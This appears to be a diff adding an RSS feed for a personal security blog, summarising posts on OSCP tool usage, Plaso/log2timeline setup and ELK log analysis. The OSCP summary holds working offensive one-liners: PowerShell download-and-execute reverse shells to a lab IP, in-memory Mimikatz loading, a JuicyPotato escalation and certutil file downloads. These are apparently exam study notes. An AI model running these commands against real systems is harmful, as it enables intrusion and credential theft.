@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Posts on MrJcK</title>
+    <link>https://mrjck.github.io/posts/</link>
+    <description>Recent content in Posts on MrJcK</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 15 Jul 2023 18:56:21 +0300</lastBuildDate><atom:link href="https://mrjck.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>OSCP | Tool usage</title>
+      <link>https://mrjck.github.io/posts/oscp-tool-usage/</link>
+      <pubDate>Sat, 15 Jul 2023 18:56:21 +0300</pubDate>
+      
+      <guid>https://mrjck.github.io/posts/oscp-tool-usage/</guid>
+      <description>Powershell
+ConPtyShell
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80 Execute mimikatz directly in memory
+IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.119.160:4444/Invoke-Mimikatz.ps1’);Invoke-Mimikatz JuicyPotato
+JuicyPotato -l 1337 -p c:32.exe -a “/c powershell.exe IEX(IWR http://192.168.119.160/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 192.168.119.160 -RemotePort 4444 -Rows 24 -Cols 80” -t * File Transfer
+certutil.exe -urlcache -f http://192.168.119.203/PsExec.exe PsExec.exe C:Defender\4.18.2008.9-0.exe -url -path MpCmdRun.exe -DownloadFile -url [url] -path [path_to_save_file] renamed.exe -urlcache -f -split http://7-zip.org/a/7z1604-x64.exe… 7zip.exe –download file Remote login using Psexec</description>
+    </item>
+    
+    <item>
+      <title>Log2timeline Using WSL</title>
+      <link>https://mrjck.github.io/posts/log2timeline-using-wsl/</link>
+      <pubDate>Sat, 15 Jul 2023 15:24:57 +0300</pubDate>
+      
+      <guid>https://mrjck.github.io/posts/log2timeline-using-wsl/</guid>
+      <description>Installation Kali Ubuntu Dockor - (My Preference) Kali sudo apt-get install plaso Ubuntu To install Plaso from the GIFT Personal Package Archive (PPA)
+sudo add-apt-repository ppa:gift/stable Update and install Plaso:
+sudo apt-get update sudo apt-get install plaso-tools Docker# Installing Docker
+docker pull log2timeline/plaso Running Docker
+docker run -t -i --entrypoint=/bin/bash -v /data&amp;lt;File Location of Host Machine&amp;gt;:/data log2timeline/plaso Converting Vhdx File to Raw Image log2timeline require raw image file. To convert vhdx to raw image we would need to install qemu:</description>
+    </item>
+    
+    <item>
+      <title>Analysing CSV file using ELK</title>
+      <link>https://mrjck.github.io/posts/analysing-csv-file-using-elk/</link>
+      <pubDate>Sat, 15 Jul 2023 13:05:49 +0300</pubDate>
+      
+      <guid>https://mrjck.github.io/posts/analysing-csv-file-using-elk/</guid>
+      <description>There are many situations when we want to analyze large size of logs. Considering the logs are in CSV format. There are many tools that make this task easy. Still, it’s frustrating us with the amount of time it takes to process the data.
+To overcome this I took the help of ELK (Docker) in a windows machine using WSL.
+Requirement Docker in Windows WSL 2 (Ubuntu/Kali) Installation ELK docker installation</description>
+    </item>
+    
+  </channel>
+</rss>
